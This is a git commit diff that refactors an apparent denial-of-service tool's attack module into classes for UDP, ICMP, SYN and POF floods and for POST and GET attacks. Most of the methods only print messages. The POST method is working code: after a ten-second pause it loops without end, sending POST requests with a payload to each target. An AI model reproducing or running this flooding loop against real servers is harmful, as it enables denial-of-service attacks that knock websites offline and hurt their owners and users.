2e65e93631626a0b1fbefc8c8e73965aa7602176
Riccardo <134144784+riccio8@users.noreply.github.com>
2024-08-04 09:55:16 +0200

    Update attack_type.py

--- lib/attack_type.py
+++ lib/attack_type.py
@@ -1,26 +1,30 @@
 import requests as res
+import time
 
+class VolumeBasedAttack:
+    def udp_flooding(self, i, vector, bye):
+        print(f"UDP flooding attack {i} on {vector} with {len(bye)} bytes")
 
-def udp_flooding(i):
-    print("first choice")
+    def icmp(self, i, vector, bye):
+        print(f"ICMP attack {i} on {vector} with {len(bye)} bytes")
 
-def ICMP(i):
-    pass
+class ProtocolAttack:
+    def syn_flood(self, i, vector, bye):
+        print(f"SYN flood attack {i} on {vector} with {len(bye)} bytes")
 
-def Syn_flood(i):
-    pass
+    def pof(self, i, vector, bye):
+        print(f"POF attack {i} on {vector} with {len(bye)} bytes")
 
-def pof(i):
-    pass
+class ApplicationLayerAttack:
+    def post(self, i, vector, bye):
+        print(f"POST attack {i} on {vector} with {len(bye)} bytes")
+        print("Using POST method to:", vector)
+        print("You have 10 seconds to end the attack, press Ctrl+C or Ctrl+Z")
+        time.sleep(10)
+        while True:
+            for target in vector:
+                response = res.post(target, data=bye)
+                print(response.text)
 
-def Post(i):
-    print("using post method to: ", vector)
-    print("u have 10 second to end the attack, press ctrl+c or ctrl+z")
-    time.sleep(10)
-    while True:
-        for target in vector:
-            response = res.post(target, data=bye, json=None)
-            print(response.text)
-
-def Get(i):
-    pass
+    def get(self, i, vector, bye):
+        print(f"GET attack {i} on {vector} with {len(bye)} bytes")
